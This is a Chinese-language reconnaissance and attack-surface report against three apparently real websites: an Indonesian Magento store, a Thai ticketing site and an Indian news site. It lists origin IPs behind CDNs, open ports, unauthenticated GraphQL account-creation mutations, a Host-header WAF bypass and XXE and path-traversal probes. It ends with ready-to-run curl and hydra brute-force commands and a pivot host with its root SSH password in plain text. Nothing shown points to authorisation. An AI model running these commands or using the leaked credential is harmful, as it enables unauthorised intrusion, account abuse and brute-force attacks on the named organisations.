# 渗透测试报告 - 攻击面分析

## 目标资产

### 9to9.co.id
- oms.9to9.co.id → 192.46.224.142 (真实IP: 172.104.189.60)
- seller.9to9.co.id → 192.46.224.142
- affiliate.9to9.co.id → 192.46.224.142
- www.9to9.co.id → 192.46.224.142

### thaiticketmajor.com
- www.thaiticketmajor.com → 98.98.253.56 (CloudWAF)
- staging.thaiticketmajor.com → 98.98.253.56
- payment.thaiticketmajor.com → 98.98.253.56
- shopping.thaiticketmajor.com → 98.98.253.56
- event.thaiticketmajor.com → 98.98.253.56
- mail.thaiticketmajor.com → 103.28.36.108 (Zimbra)

### financialexpress.com
- www.financialexpress.com → 23.207.42.133 (Akamai)

---

## 开放端口

### 172.104.189.60 (9to9.co.id后端)
```
21/tcp    FTP       vsftpd 3.0.5
22/tcp    SSH       OpenSSH 9.6p1
80/tcp    HTTP      SWIFT
443/tcp   HTTPS     nginx
3306/tcp  MySQL     8.0.41-32
8080/tcp  HTTP      nginx
8443/tcp  HTTPS     (SSL error)
9100/tcp  jetdirect (返回400)
33060/tcp MySQLx
```

### 103.28.36.108 (thaiticketmajor.com)
```
80/tcp   HTTP   LiteSpeed
443/tcp  HTTPS  LiteSpeed
```

---

## 攻击面

### 1. GraphQL API (oms.9to9.co.id)

**端点:**
```
https://oms.9to9.co.id/graphql
https://seller.9to9.co.id/graphql
https://affiliate.9to9.co.id/graphql
```

**可用操作:**
```graphql
# 未授权查询
{ products(search: "", pageSize: 100) { items { sku name price { regularPrice { amount { value } } } } } }
{ storeConfig { base_url } }

# 未授权注册
mutation {
  createCustomer(input: {
    email: "test@test.com"
    firstname: "Test"
    lastname: "User"
    password: "Test@123"
  }) {
    customer { email }
  }
}

# Vendor申请
mutation {
  addNewVendorRequest(input: {
    email: "vendor@test.com"
    first_name: "Test"
    last_name: "Vendor"
    password: "Test@123"
    password_confirmation: "Test@123"
    company_name: "TestCo"
  }) {
    status
  }
}
```

**测试结果:**
- 产品数据可枚举
- 账号可批量注册
- Vendor申请可提交

---

### 2. REST API (oms.9to9.co.id)

**可访问端点:**
```
GET  /rest/V1/directory/countries          → 200 (无需认证)
GET  /rest/V1/store/storeConfigs           → 200 (无需认证)
POST /rest/V1/customers/me                 → 401 (需要认证)
GET  /rest/V1/products                     → 401 (需要认证)
POST /rest/V1/integration/admin/token      → 401 (认证失败)
POST /rest/V1/guest-carts/                 → 200 (返回cart_id)
```

**绕过CDN直连:**
```bash
curl -sk http://172.104.189.60/rest/V1/directory/countries -H "Host: oms.9to9.co.id"
```

---

### 3. 隐藏端点

```
https://oms.9to9.co.id/ping              → "pong"
https://oms.9to9.co.id/execute           → 403 Forbidden
https://www.thaiticketmajor.com/status   → "OK"
```

---

### 4. 服务爆破点

**FTP (172.104.189.60:21):**
```bash
ftp 172.104.189.60
> user anonymous
> pass anonymous
→ Permission denied
```

**SSH (172.104.189.60:22):**
```
测试用户: root, admin, ubuntu, magento
测试密码: root, admin, password, 123456, magento, 9to9
结果: 全部失败
```

**MySQL (172.104.189.60:3306):**
```
测试用户: root, admin, magento, mysql
测试密码: root, admin, password, 123456, magento, 9to9
结果: 全部失败 (ERROR 1045)
```

---

### 5. Zimbra (mail.thaiticketmajor.com)

**SOAP端点:**
```
POST /service/soap
Content-Type: application/soap+xml

<?xml version="1.0"?>
<soap:Envelope>
  <soap:Body>
    <AuthRequest>
      <account>admin</account>
      <password>test</password>
    </AuthRequest>
  </soap:Body>
</soap:Envelope>

→ authentication failed
```

**路径遍历测试:**
```
../../../../../../../etc/passwd → authentication failed (端点处理请求但拒绝)
```

---

### 6. WAF/CDN绕过

**CloudWAF (staging.thaiticketmajor.com):**
```bash
curl -sk https://staging.thaiticketmajor.com/admin
→ 418 (WAF拦截)

curl -sk https://staging.thaiticketmajor.com/admin -H "Host: localhost"
→ 404 (绕过WAF，但页面不存在)
```

**Akamai (financialexpress.com):**
```
未找到绕过方法
```

---

### 7. 技术栈指纹

**9to9.co.id:**
- Magento 2.3 Community Edition
- PHP (版本未暴露)
- nginx
- MySQL 8.0.41-32
- Ubuntu (OpenSSH 9.6p1)

**thaiticketmajor.com:**
- LiteSpeed Web Server
- CloudWAF
- Zimbra Mail (版本未知)

**financialexpress.com:**
- Akamai CDN
- WordPress (通过响应特征推断)

---

### 8. Magento后台

**路径测试:**
```
/admin           → 302 → https://affiliate.9to9.co.id/admin
/administrator   → 302
/backend         → 302
```

**Admin Token获取:**
```bash
POST /rest/V1/integration/admin/token
{"username":"admin","password":"admin"}

→ {"message":"The account sign-in was incorrect or your account is disabled temporarily."}
```

---

### 9. 潜在XXE

**端点:**
```
POST /rest/V1/guest-carts/
Content-Type: application/xml

<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>

→ 返回随机token (x98Pw2w2uPj5VXBz3grRQAvBjPxxLJ2d)
```

**测试结果:**
- 端点接受XML输入
- 返回token而非文件内容
- 无法确认XXE可利用

---

### 10. 绕过CDN直连后端

**方法:**
```bash
# 通过pivot主机
ssh -p 2233 root@82.29.71.156
curl -sk http://172.104.189.60 -H "Host: oms.9to9.co.id"
```

**可绕过服务:**
- GraphQL
- REST API
- Web应用

---

## 资产汇总

**IP地址:**
```
192.46.224.142    (9to9.co.id CDN)
172.104.189.60    (9to9.co.id 真实后端)
98.98.253.56      (thaiticketmajor.com CDN)
103.28.36.108     (mail.thaiticketmajor.com)
23.207.42.133     (financialexpress.com CDN)
```

**子域名:**
```
9to9.co.id:
  - oms.9to9.co.id
  - seller.9to9.co.id
  - affiliate.9to9.co.id
  - www.9to9.co.id

thaiticketmajor.com:
  - www.thaiticketmajor.com
  - staging.thaiticketmajor.com
  - payment.thaiticketmajor.com
  - shopping.thaiticketmajor.com
  - event.thaiticketmajor.com
  - mail.thaiticketmajor.com

financialexpress.com:
  - www.financialexpress.com
```

**API端点:**
```
GraphQL:
  - https://oms.9to9.co.id/graphql
  - https://seller.9to9.co.id/graphql
  - https://affiliate.9to9.co.id/graphql

REST API:
  - https://oms.9to9.co.id/rest/V1/*

SOAP:
  - https://mail.thaiticketmajor.com/service/soap
```

**数据库:**
```
MySQL: 172.104.189.60:3306 (root密码未知)
MySQLx: 172.104.189.60:33060
```

---

## 可执行攻击向量

### 数据枚举
```bash
# 产品数据
curl -sk https://oms.9to9.co.id/graphql -H "Content-Type: application/json" \
  -d '{"query":"{ products(search:\"\",pageSize:100) { items { sku name price { regularPrice { amount { value } } } } } }"}'

# 国家列表
curl -sk https://oms.9to9.co.id/rest/V1/directory/countries
```

### 账号注册
```bash
# Customer注册
curl -sk https://oms.9to9.co.id/graphql -H "Content-Type: application/json" \
  -d '{"query":"mutation { createCustomer(input: {email:\"test@test.com\",firstname:\"Test\",lastname:\"User\",password:\"Test@123\"}) { customer { email } } }"}'

# Vendor申请
curl -sk https://oms.9to9.co.id/graphql -H "Content-Type: application/json" \
  -d '{"query":"mutation { addNewVendorRequest(input: {email:\"vendor@test.com\",first_name:\"Test\",last_name:\"Vendor\",password:\"Test@123\",password_confirmation:\"Test@123\",company_name:\"TestCo\"}) { status } }"}'
```

### 暴力破解
```bash
# MySQL
通过pivot主机: ssh -p 2233 root@82.29.71.156
使用大字典: rockyou.txt

# SSH
hydra -L users.txt -P pass.txt ssh://172.104.189.60 -t 4

# FTP
hydra -L users.txt -P pass.txt ftp://172.104.189.60 -t 4
```

### WAF绕过
```bash
# CloudWAF
curl -sk https://staging.thaiticketmajor.com/admin -H "Host: localhost"
```

---

## Pivot主机

**连接:**
```bash
ssh -p 2233 root@82.29.71.156
密码: @admin1314@
```

**用途:**
- 绕过CDN直连后端
- 内网端口扫描
- 暴力破解攻击
